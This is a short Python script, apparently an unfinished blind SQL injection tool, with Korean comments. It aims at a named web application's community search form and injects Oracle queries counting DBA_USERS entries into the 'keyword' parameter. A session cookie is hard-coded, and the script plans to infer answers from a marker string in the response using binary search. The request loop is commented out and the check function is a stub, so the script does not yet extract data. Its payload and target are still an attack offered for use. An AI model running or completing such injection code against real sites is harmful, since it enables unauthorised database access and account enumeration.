import requests
import random
import time

### VAL AREA
targetURL = "http://elms1.skinfosec.co.kr:8082/community6/free"
targetString = "카카오"

baseQuery = "aaaa%' and {} and 'a%'='a"

userNameCount = "(SELECT COUNT(USERNAME) AS total_usernames FROM DBA_USERS) > {}"

userNameData = "(SELECT * FROM DBA_USERS) > {}"

headers = {"Content-Type": "application/x-www-form-urlencoded"}
cookies = {"JSESSIONID": "8623A875E3EA6CF5471045FFA0614F6F"}
data = {
    "startDt": "",
    "endDt": "",
    "searchType": "all",
    "keyword": "aaaa%' and 'a%'='a",
}


### FUNCTION AREA
def check_query(query, mid):
    # FIX THIS LATER
    return query > mid


def binary_search(low, high, query):
    if low <= high:
        mid = (low + high) // 2
        if check_query(query, mid):
            # 쿼리 응답이 탐색값 초과(>)
            return binary_search(mid + 1, high, query)
        else:
            # 쿼리 응답이 탐색값 이하(=<)
            result = binary_search(low, mid - 1, query)
            # 탐색 값이 없을 시 mid 반환
            return mid if result is None else result
    else:
        # 범위 벗어남
        return None


"""
while True:


    data["keyword"] = baseQuery.format(userNameCount)
    r = requests.post(targetURL, headers=headers, cookies=cookies, data=data)

    if targetString in r.text:
        print("success!")

    time.sleep(10)
"""

if __name__ == "__main__":
    result = binary_search(0, 100, 35)

    print(result)
